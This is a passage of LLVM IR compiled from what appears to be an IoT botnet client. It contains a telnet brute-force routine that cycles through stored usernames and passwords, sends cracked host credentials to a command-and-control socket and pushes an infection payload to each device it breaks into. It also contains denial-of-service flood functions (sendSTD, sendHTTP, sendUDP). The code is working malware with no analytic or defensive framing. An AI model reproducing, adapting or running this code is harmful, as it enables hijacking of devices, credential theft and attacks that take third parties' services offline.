  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 9
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @contains_fail(i8* %352)
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %355, label %359

; <label>:355:                                    ; preds = %347
  %356 = load i32, i32* %5, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %357
  call void @advance_state(%struct.telstate_t* %358, i32 0)
  br label %363

; <label>:359:                                    ; preds = %347
  %360 = load i32, i32* %5, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %361
  call void @advance_state(%struct.telstate_t* %362, i32 3)
  br label %363

; <label>:363:                                    ; preds = %359, %355
  br label %673

; <label>:364:                                    ; preds = %333
  %365 = load i32, i32* %5, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 7
  %369 = load i32, i32* %368, align 16
  %370 = add i32 %369, 7
  %371 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %372 = icmp ult i32 %370, %371
  br i1 %372, label %373, label %377

; <label>:373:                                    ; preds = %364
  %374 = load i32, i32* %5, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %375
  call void @reset_telstate(%struct.telstate_t* %376)
  br label %377

; <label>:377:                                    ; preds = %373, %364
  br label %672

; <label>:378:                                    ; preds = %92
  %379 = load i32, i32* %5, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 0
  %383 = load i32, i32* %382, align 16
  %384 = load i32, i32* %5, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 4
  %388 = load i8, i8* %387, align 2
  %389 = zext i8 %388 to i64
  %390 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %389
  %391 = load i8*, i8** %390, align 8
  %392 = load i32, i32* %5, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 4
  %396 = load i8, i8* %395, align 2
  %397 = zext i8 %396 to i64
  %398 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %397
  %399 = load i8*, i8** %398, align 8
  %400 = call i64 @strlen(i8* %399) #10
  %401 = call i64 @send(i32 %383, i8* %391, i64 %400, i32 16384)
  %402 = icmp slt i64 %401, 0
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %378
  %404 = load i32, i32* %5, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %405
  call void @reset_telstate(%struct.telstate_t* %406)
  br label %673

; <label>:407:                                    ; preds = %378
  %408 = load i32, i32* %5, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 0
  %412 = load i32, i32* %411, align 16
  %413 = call i64 @send(i32 %412, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %414 = icmp slt i64 %413, 0
  br i1 %414, label %415, label %419

; <label>:415:                                    ; preds = %407
  %416 = load i32, i32* %5, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %417
  call void @reset_telstate(%struct.telstate_t* %418)
  br label %673

; <label>:419:                                    ; preds = %407
  %420 = load i32, i32* %5, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %421
  call void @advance_state(%struct.telstate_t* %422, i32 4)
  br label %672

; <label>:423:                                    ; preds = %92
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 16
  %429 = load i32, i32* %3, align 4
  %430 = load i32, i32* %5, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 9
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @read_until_response(i32 %428, i32 %429, i8* %434, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %436 = icmp ne i32 %435, 0
  br i1 %436, label %437, label %454

; <label>:437:                                    ; preds = %423
  %438 = load i32, i32* %5, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %439
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %440, i32 0, i32 9
  %442 = load i8*, i8** %441, align 8
  %443 = call i32 @contains_fail(i8* %442)
  %444 = icmp ne i32 %443, 0
  br i1 %444, label %445, label %449

; <label>:445:                                    ; preds = %437
  %446 = load i32, i32* %5, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %447
  call void @advance_state(%struct.telstate_t* %448, i32 0)
  br label %453

; <label>:449:                                    ; preds = %437
  %450 = load i32, i32* %5, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %451
  call void @advance_state(%struct.telstate_t* %452, i32 5)
  br label %453

; <label>:453:                                    ; preds = %449, %445
  br label %673

; <label>:454:                                    ; preds = %423
  %455 = load i32, i32* %5, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %456
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %457, i32 0, i32 7
  %459 = load i32, i32* %458, align 16
  %460 = add i32 %459, 3
  %461 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %462 = icmp ult i32 %460, %461
  br i1 %462, label %463, label %467

; <label>:463:                                    ; preds = %454
  %464 = load i32, i32* %5, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %465
  call void @reset_telstate(%struct.telstate_t* %466)
  br label %467

; <label>:467:                                    ; preds = %463, %454
  br label %672

; <label>:468:                                    ; preds = %92
  %469 = load i32, i32* %5, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 0
  %473 = load i32, i32* %472, align 16
  %474 = load i32, i32* %5, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 5
  %478 = load i8, i8* %477, align 1
  %479 = zext i8 %478 to i64
  %480 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %479
  %481 = load i8*, i8** %480, align 8
  %482 = load i32, i32* %5, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 5
  %486 = load i8, i8* %485, align 1
  %487 = zext i8 %486 to i64
  %488 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %487
  %489 = load i8*, i8** %488, align 8
  %490 = call i64 @strlen(i8* %489) #10
  %491 = call i64 @send(i32 %473, i8* %481, i64 %490, i32 16384)
  %492 = icmp slt i64 %491, 0
  br i1 %492, label %493, label %497

; <label>:493:                                    ; preds = %468
  %494 = load i32, i32* %5, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %495
  call void @reset_telstate(%struct.telstate_t* %496)
  br label %673

; <label>:497:                                    ; preds = %468
  %498 = load i32, i32* %5, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 0
  %502 = load i32, i32* %501, align 16
  %503 = call i64 @send(i32 %502, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %504 = icmp slt i64 %503, 0
  br i1 %504, label %505, label %509

; <label>:505:                                    ; preds = %497
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %507
  call void @reset_telstate(%struct.telstate_t* %508)
  br label %673

; <label>:509:                                    ; preds = %497
  %510 = load i32, i32* %5, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %511
  call void @advance_state(%struct.telstate_t* %512, i32 6)
  br label %672

; <label>:513:                                    ; preds = %92
  %514 = load i32, i32* %5, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 16
  %519 = load i32, i32* %3, align 4
  %520 = load i32, i32* %5, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 9
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @read_until_response(i32 %518, i32 %519, i8* %524, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %526 = icmp ne i32 %525, 0
  br i1 %526, label %527, label %597

; <label>:527:                                    ; preds = %513
  %528 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %529 = load i32, i32* %5, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %530
  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 7
  store i32 %528, i32* %532, align 16
  %533 = load i32, i32* %5, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 9
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @contains_fail(i8* %537)
  %539 = icmp ne i32 %538, 0
  br i1 %539, label %540, label %544

; <label>:540:                                    ; preds = %527
  %541 = load i32, i32* %5, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %542
  call void @advance_state(%struct.telstate_t* %543, i32 0)
  br label %596

; <label>:544:                                    ; preds = %527
  %545 = load i32, i32* %5, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 9
  %549 = load i8*, i8** %548, align 8
  %550 = call i32 @contains_success(i8* %549)
  %551 = icmp ne i32 %550, 0
  br i1 %551, label %552, label %591

; <label>:552:                                    ; preds = %544
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 3
  %557 = load i8, i8* %556, align 1
  %558 = zext i8 %557 to i32
  %559 = icmp eq i32 %558, 2
  br i1 %559, label %560, label %564

; <label>:560:                                    ; preds = %552
  %561 = load i32, i32* %5, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %562
  call void @advance_state(%struct.telstate_t* %563, i32 7)
  br label %590

; <label>:564:                                    ; preds = %552
  %565 = load i32, i32* @HeliosCommSock, align 4
  %566 = load i32, i32* %5, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %567
  %569 = call i8* @get_telstate_host(%struct.telstate_t* %568)
  %570 = load i32, i32* %5, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %571
  %573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %572, i32 0, i32 4
  %574 = load i8, i8* %573, align 2
  %575 = zext i8 %574 to i64
  %576 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %575
  %577 = load i8*, i8** %576, align 8
  %578 = load i32, i32* %5, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 5
  %582 = load i8, i8* %581, align 1
  %583 = zext i8 %582 to i64
  %584 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %583
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %565, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.348, i32 0, i32 0), i8* %569, i8* %577, i8* %585)
  %587 = load i32, i32* %5, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %588
  call void @advance_state(%struct.telstate_t* %589, i32 7)
  br label %590

; <label>:590:                                    ; preds = %564, %560
  br label %595

; <label>:591:                                    ; preds = %544
  %592 = load i32, i32* %5, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %593
  call void @reset_telstate(%struct.telstate_t* %594)
  br label %595

; <label>:595:                                    ; preds = %591, %590
  br label %596

; <label>:596:                                    ; preds = %595, %540
  br label %673

; <label>:597:                                    ; preds = %513
  %598 = load i32, i32* %5, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 7
  %602 = load i32, i32* %601, align 16
  %603 = add i32 %602, 7
  %604 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %605 = icmp ult i32 %603, %604
  br i1 %605, label %606, label %610

; <label>:606:                                    ; preds = %597
  %607 = load i32, i32* %5, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %608
  call void @reset_telstate(%struct.telstate_t* %609)
  br label %610

; <label>:610:                                    ; preds = %606, %597
  br label %672

; <label>:611:                                    ; preds = %92
  %612 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %613 = load i32, i32* %5, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 7
  store i32 %612, i32* %616, align 16
  %617 = load i32, i32* %5, align 4
  %618 = sext i32 %617 to i64
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 16
  %622 = call i64 @send(i32 %621, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.349, i32 0, i32 0), i64 4, i32 16384)
  %623 = icmp slt i64 %622, 0
  br i1 %623, label %624, label %625

; <label>:624:                                    ; preds = %611
  br label %625

; <label>:625:                                    ; preds = %624, %611
  %626 = load i32, i32* %5, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 16
  %631 = call i64 @send(i32 %630, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i64 7, i32 16384)
  %632 = icmp slt i64 %631, 0
  br i1 %632, label %633, label %634

; <label>:633:                                    ; preds = %625
  br label %634

; <label>:634:                                    ; preds = %633, %625
  %635 = load i32, i32* %5, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 0
  %639 = load i32, i32* %638, align 16
  %640 = load i8*, i8** @infect, align 8
  %641 = load i8*, i8** @infect, align 8
  %642 = call i64 @strlen(i8* %641) #10
  %643 = call i64 @send(i32 %639, i8* %640, i64 %642, i32 16384)
  %644 = icmp slt i64 %643, 0
  br i1 %644, label %645, label %649

; <label>:645:                                    ; preds = %634
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %647
  call void @reset_telstate(%struct.telstate_t* %648)
  br label %673

; <label>:649:                                    ; preds = %634
  %650 = load i32, i32* %5, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 7
  %654 = load i32, i32* %653, align 16
  %655 = add i32 %654, 25
  %656 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %657 = icmp ult i32 %655, %656
  br i1 %657, label %658, label %671

; <label>:658:                                    ; preds = %649
  %659 = load i32, i32* %5, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 3
  %663 = load i8, i8* %662, align 1
  %664 = zext i8 %663 to i32
  %665 = icmp ne i32 %664, 3
  br i1 %665, label %666, label %667

; <label>:666:                                    ; preds = %658
  br label %667

; <label>:667:                                    ; preds = %666, %658
  %668 = load i32, i32* %5, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %669
  call void @reset_telstate(%struct.telstate_t* %670)
  br label %671

; <label>:671:                                    ; preds = %667, %649
  br label %672

; <label>:672:                                    ; preds = %671, %610, %509, %467, %419, %377, %332, %234, %92
  br label %673

; <label>:673:                                    ; preds = %672, %645, %596, %505, %493, %453, %415, %403, %363, %314, %310, %199, %168, %155
  %674 = load i32, i32* %5, align 4
  %675 = add nsw i32 %674, 1
  store i32 %675, i32* %5, align 4
  br label %75

; <label>:676:                                    ; preds = %75
  br label %73
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %66, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 65, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %39
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %22

; <label>:22:                                     ; preds = %64, %6
  %23 = load i32, i32* %14, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %67

; <label>:26:                                     ; preds = %22
  %27 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %28 = load i8*, i8** %7, align 8
  %29 = load i8*, i8** %10, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = call i32 @rand() #2
  %32 = srem i32 %31, 36
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [789 x i8*], [789 x i8*]* @UserAgents, i64 0, i64 %33
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.387, i32 0, i32 0), i8* %28, i8* %29, i8* %30, i8* %35) #2
  %37 = call i32 @fork() #2
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %63

; <label>:39:                                     ; preds = %26
  br label %40

; <label>:40:                                     ; preds = %61, %39
  %41 = load i32, i32* %15, align 4
  %42 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %43 = icmp sgt i32 %41, %42
  br i1 %43, label %44, label %62

; <label>:44:                                     ; preds = %40
  %45 = load i8*, i8** %8, align 8
  %46 = load i16, i16* %9, align 2
  %47 = call i32 @socket_connect(i8* %45, i16 zeroext %46)
  store i32 %47, i32* %13, align 4
  %48 = load i32, i32* %13, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %61

; <label>:50:                                     ; preds = %44
  %51 = load i32, i32* %13, align 4
  %52 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %54 = call i64 @strlen(i8* %53) #10
  %55 = call i64 @write(i32 %51, i8* %52, i64 %54)
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %58 = call i64 @read(i32 %56, i8* %57, i64 1)
  %59 = load i32, i32* %13, align 4
  %60 = call i32 @close(i32 %59)
  br label %61

; <label>:61:                                     ; preds = %50, %44
  br label %40

; <label>:62:                                     ; preds = %40
  call void @exit(i32 0) #14
  unreachable

; <label>:63:                                     ; preds = %26
  br label %64

; <label>:64:                                     ; preds = %63
  %65 = load i32, i32* %14, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %14, align 4
  br label %22

; <label>:67:                                     ; preds = %22
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46
